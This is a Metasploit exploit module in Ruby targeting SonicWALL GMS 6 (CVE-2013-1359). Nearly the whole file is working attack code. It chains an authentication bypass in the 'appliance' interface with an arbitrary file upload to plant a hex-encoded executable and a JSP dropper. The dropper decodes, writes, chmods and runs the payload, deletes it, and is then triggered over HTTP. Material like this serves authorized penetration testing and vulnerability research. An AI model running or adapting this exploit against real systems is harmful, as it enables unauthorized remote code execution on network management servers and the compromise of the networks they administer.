##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	HttpFingerprint = { :pattern => [ /Apache-Coyote/ ] }

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::EXE
	include Msf::Exploit::FileDropper

	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'SonicWALL GMS 6 Arbitrary File Upload',
			'Description' => %q{
					This module exploits a code execution flaw in SonicWALL GMS. It exploits two
				vulnerabilities in order to get its objective. An authentication bypass in the
				Web Administration interface allows to abuse the "appliance" application and upload
				an arbitrary payload embedded in a JSP. The module has been tested successfully on
				SonicWALL GMS 6.0.6017 over Windows 2003 SP2 and SonicWALL GMS 6.0.6022 Virtual
				Appliance (Linux). On the Virtual Appliance the linux meterpreter hasn't run
				successfully while testing, shell payload have been used.
			},
			'Author'       =>
				[
					'Nikolas Sotiriu', # Vulnerability Discovery
					'Julian Vilas <julian.vilas[at]gmail.com>', # Metasploit module
					'juan vazquez' # Metasploit module
				],
			'License'     => MSF_LICENSE,
			'References'  =>
				[
					[ 'CVE', '2013-1359'],
					[ 'OSVDB', '89347' ],
					[ 'BID', '57445' ],
					[ 'EDB', '24204' ]
				],
			'Privileged'  => true,
			'Platform'    => [ 'win', 'linux' ],
			'Targets'     =>
				[
					[ 'SonicWALL GMS 6.0 Viewpoint / Windows 2003 SP2',
						{
							'Arch' => ARCH_X86,
							'Platform' => 'win'
						}
					],
					[ 'SonicWALL GMS Viewpoint 6.0 Virtual Appliance (Linux)',
						{
							'Arch' => ARCH_X86,
							'Platform' => 'linux'
						}
					]
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Jan 17 2012'))

		register_options(
			[
				Opt::RPORT(80),
				OptString.new('TARGETURI', [true, 'Path to SonicWall GMS', '/'])
			], self.class)
	end


	def on_new_session
		# on_new_session will force stdapi to load (for Linux meterpreter)
	end


	def generate_jsp
		var_hexpath       = Rex::Text.rand_text_alpha(rand(8)+8)
		var_exepath       = Rex::Text.rand_text_alpha(rand(8)+8)
		var_data          = Rex::Text.rand_text_alpha(rand(8)+8)
		var_inputstream   = Rex::Text.rand_text_alpha(rand(8)+8)
		var_outputstream  = Rex::Text.rand_text_alpha(rand(8)+8)
		var_numbytes      = Rex::Text.rand_text_alpha(rand(8)+8)
		var_bytearray     = Rex::Text.rand_text_alpha(rand(8)+8)
		var_bytes         = Rex::Text.rand_text_alpha(rand(8)+8)
		var_counter       = Rex::Text.rand_text_alpha(rand(8)+8)
		var_char1         = Rex::Text.rand_text_alpha(rand(8)+8)
		var_char2         = Rex::Text.rand_text_alpha(rand(8)+8)
		var_comb          = Rex::Text.rand_text_alpha(rand(8)+8)
		var_exe           = Rex::Text.rand_text_alpha(rand(8)+8)
		@var_hexfile      = Rex::Text.rand_text_alpha(rand(8)+8)
		var_proc          = Rex::Text.rand_text_alpha(rand(8)+8)
		var_fperm         = Rex::Text.rand_text_alpha(rand(8)+8)
		var_fdel          = Rex::Text.rand_text_alpha(rand(8)+8)

		jspraw =  "<%@ page import=\"java.io.*\" %>\n"
		jspraw << "<%\n"
		jspraw << "String #{var_hexpath} = application.getRealPath(\"/\") + \"/#{@var_hexfile}.txt\";\n"
		jspraw << "String #{var_exepath} = System.getProperty(\"java.io.tmpdir\") + \"/#{var_exe}\";\n"
		jspraw << "String #{var_data} = \"\";\n"

		jspraw << "if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") != -1){\n"
		jspraw << "#{var_exepath} = #{var_exepath}.concat(\".exe\");\n"
		jspraw << "}\n"

		jspraw << "FileInputStream #{var_inputstream} = new FileInputStream(#{var_hexpath});\n"
		jspraw << "FileOutputStream #{var_outputstream} = new FileOutputStream(#{var_exepath});\n"

		jspraw << "int #{var_numbytes} = #{var_inputstream}.available();\n"
		jspraw << "byte #{var_bytearray}[] = new byte[#{var_numbytes}];\n"
		jspraw << "#{var_inputstream}.read(#{var_bytearray});\n"
		jspraw << "#{var_inputstream}.close();\n"

		jspraw << "byte[] #{var_bytes} = new byte[#{var_numbytes}/2];\n"
		jspraw << "for (int #{var_counter} = 0; #{var_counter} < #{var_numbytes}; #{var_counter} += 2)\n"
		jspraw << "{\n"
		jspraw << "char #{var_char1} = (char) #{var_bytearray}[#{var_counter}];\n"
		jspraw << "char #{var_char2} = (char) #{var_bytearray}[#{var_counter} + 1];\n"
		jspraw << "int #{var_comb} = Character.digit(#{var_char1}, 16) & 0xff;\n"
		jspraw << "#{var_comb} <<= 4;\n"
		jspraw << "#{var_comb} += Character.digit(#{var_char2}, 16) & 0xff;\n"
		jspraw << "#{var_bytes}[#{var_counter}/2] = (byte)#{var_comb};\n"
		jspraw << "}\n"

		jspraw << "#{var_outputstream}.write(#{var_bytes});\n"
		jspraw << "#{var_outputstream}.close();\n"

		jspraw << "if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") == -1){\n"
		jspraw << "String[] #{var_fperm} = new String[3];\n"
		jspraw << "#{var_fperm}[0] = \"chmod\";\n"
		jspraw << "#{var_fperm}[1] = \"+x\";\n"
		jspraw << "#{var_fperm}[2] = #{var_exepath};\n"
		jspraw << "Process #{var_proc} = Runtime.getRuntime().exec(#{var_fperm});\n"
		jspraw << "if (#{var_proc}.waitFor() == 0) {\n"
		jspraw << "#{var_proc} = Runtime.getRuntime().exec(#{var_exepath});\n"
		jspraw << "}\n"
		# Linux and other UNICES allow removing files while they are in use...
		jspraw << "File #{var_fdel} = new File(#{var_exepath}); #{var_fdel}.delete();\n"
		jspraw << "} else {\n"
		# Windows does not ..
		jspraw << "Process #{var_proc} = Runtime.getRuntime().exec(#{var_exepath});\n"
		jspraw << "}\n"

		jspraw << "%>\n"
		return jspraw
	end

	def get_install_path
		res = send_request_cgi(
			{
				'uri'    => "#{@uri}appliance/applianceMainPage?skipSessionCheck=1",
				'method' => 'POST',
				'connection' => 'TE, close',
				'headers' =>
					{
						'TE' => "deflate,gzip;q=0.3",
					},
				'vars_post' => {
					'num' => '123456',
					'action' => 'show_diagnostics',
					'task' => 'search',
					'item' => 'application_log',
					'criteria' => '*.*',
					'width' => '500'
				}
			})

		if res and res.code == 200 and res.body =~ /VALUE="(.*)logs/
			return $1
		end

		return nil
	end

	def upload_file(location, filename, contents)
		post_data = Rex::MIME::Message.new
		post_data.add_part("file_system", nil, nil, "form-data; name=\"action\"")
		post_data.add_part("uploadFile", nil, nil, "form-data; name=\"task\"")
		post_data.add_part(location, nil, nil, "form-data; name=\"searchFolder\"")
		post_data.add_part(contents, "application/octet-stream", nil, "form-data; name=\"uploadFilename\"; filename=\"#{filename}\"")

		data = post_data.to_s
		data.gsub!(/\r\n\r\n--_Part/, "\r\n--_Part")

		res = send_request_cgi(
			{
				'uri'    => "#{@uri}appliance/applianceMainPage?skipSessionCheck=1",
				'method' => 'POST',
				'data'   => data,
				'ctype'  => "multipart/form-data; boundary=#{post_data.bound}",
				'headers' =>
					{
						'TE' => "deflate,gzip;q=0.3",
					},
				'connection' => 'TE, close'
			})

		if res and res.code == 200 and res.body.empty?
			return true
		else
			return false
		end
	end

	def check
		@peer = "#{rhost}:#{rport}"
		@uri = normalize_uri(target_uri.path)
		@uri << '/' if @uri[-1,1] != '/'

		if get_install_path.nil?
			return Exploit::CheckCode::Safe
		end

		return Exploit::CheckCode::Vulnerable
	end

	def exploit
		@peer = "#{rhost}:#{rport}"
		@uri = normalize_uri(target_uri.path)
		@uri << '/' if @uri[-1,1] != '/'

		# Get Tomcat installation path
		print_status("#{@peer} - Retrieving Tomcat installation path...")
		install_path = get_install_path

		if install_path.nil?
			fail_with(Exploit::Failure::NotVulnerable, "#{@peer} - Unable to retrieve the Tomcat installation path")
		end

		print_good("#{@peer} - Tomcat installed on #{install_path}")

		if target['Platform'] == "linux"
			@location = "#{install_path}webapps/appliance/"
		elsif target['Platform'] == "win"
			@location = "#{install_path}webapps\\appliance\\"
		end


		# Upload the JSP and the raw payload
		@jsp_name = rand_text_alphanumeric(8+rand(8))

		jspraw = generate_jsp

		# Specify the payload in hex as an extra file..
		payload_hex = payload.encoded_exe.unpack('H*')[0]

		print_status("#{@peer} - Uploading the payload")

		if upload_file(@location, "#{@var_hexfile}.txt", payload_hex)
			print_good("#{@peer} - Payload successfully uploaded to #{@location}#{@var_hexfile}.txt")
		else
			fail_with(Exploit::Failure::NotVulnerable, "#{@peer} - Error uploading the Payload")
		end

		print_status("#{@peer} - Uploading the payload")

		if upload_file(@location, "#{@jsp_name}.jsp", jspraw)
			print_good("#{@peer} - JSP successfully uploaded to #{@location}#{@jsp_name}.jsp")
		else
			fail_with(Exploit::Failure::NotVulnerable, "#{@peer} - Error uploading the jsp")
		end

		print_status("Triggering payload at '#{@uri}#{@jsp_name}.jsp' ...")
		res = send_request_cgi(
			{
				'uri'    => "#{@uri}appliance/#{@jsp_name}.jsp",
				'method' => 'GET'
			})

		if res and res.code != 200
			print_warning("#{@peer} - Error triggering the payload")
		end

		register_files_for_cleanup("#{@location}#{@var_hexfile}.txt")
		register_files_for_cleanup("#{@location}#{@jsp_name}.jsp")
	end

end
